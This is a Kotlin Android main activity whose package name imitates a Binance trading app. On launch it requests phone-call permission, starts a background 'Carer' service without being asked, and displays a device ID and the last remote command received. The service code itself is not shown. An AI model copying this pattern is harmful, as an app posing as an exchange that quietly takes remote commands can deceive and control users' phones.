package dApp.binance.Trading.arfu

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.TextView
import androidx.core.app.ActivityCompat
import android.Manifest

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var lastCommandText: TextView
    private var hasAllPermissions = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        lastCommandText = findViewById(R.id.lastCommandText)

        findViewById<Button>(R.id.settingsButton).setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }

        findViewById<Button>(R.id.viewLogsButton).setOnClickListener {
            startActivity(Intent(this, LogViewerActivity::class.java))
        }

        // Request permissions on first launch
        requestRequiredPermissions()

        // Start Carer Service
        startCarerService()

        // Update UI
        updateStatus()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun requestRequiredPermissions() {
        val permissions = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CALL_PHONE)
            }
            if (checkSelfPermission(Manifest.permission.INTERNET) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.INTERNET)
            }
        }

        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), REQUEST_CODE_PERMISSIONS)
        } else {
            hasAllPermissions = true
        }
    }

    private fun startCarerService() {
        val intent = Intent(this, CarerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun updateStatus() {
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        val deviceId = FirebaseHelper.getDeviceId(this)
        val lastCommand = sharedPref.getString("last_command", "None")

        statusText.text = if (isEnabled) "✅ SERVICE ACTIVE" else "⚠️ SERVICE DISABLED"
        deviceIdText.text = "Device ID: $deviceId"
        lastCommandText.text = "Last Command: $lastCommand"
    }

    companion object {
        const val REQUEST_CODE_PERMISSIONS = 100
    }
}
